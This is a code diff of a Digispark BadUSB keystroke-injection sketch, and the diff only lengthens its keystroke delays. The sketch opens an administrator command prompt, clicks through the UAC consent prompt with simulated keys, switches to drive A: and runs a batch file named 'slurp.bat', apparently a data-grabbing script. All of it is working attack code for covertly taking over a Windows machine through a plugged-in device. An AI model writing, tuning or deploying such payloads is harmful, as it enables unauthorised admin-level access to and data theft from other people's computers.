@@ -2,15 +2,15 @@
 void setup() {
   DigiKeyboard.delay(1000);
   DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT);
-  DigiKeyboard.delay(1000);
+  DigiKeyboard.delay(2000);
   DigiKeyboard.print("cmd");
-  DigiKeyboard.delay(1000);
+  DigiKeyboard.delay(2000);
   DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);
-  DigiKeyboard.delay(1000);
+  DigiKeyboard.delay(2000);
   DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
-  DigiKeyboard.delay(750);
+  DigiKeyboard.delay(2000);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(500);
+  DigiKeyboard.delay(1000);
   DigiKeyboard.println("color a");
   DigiKeyboard.println("A:");
   DigiKeyboard.println("if Exist slurp.bat (slurp.bat)");
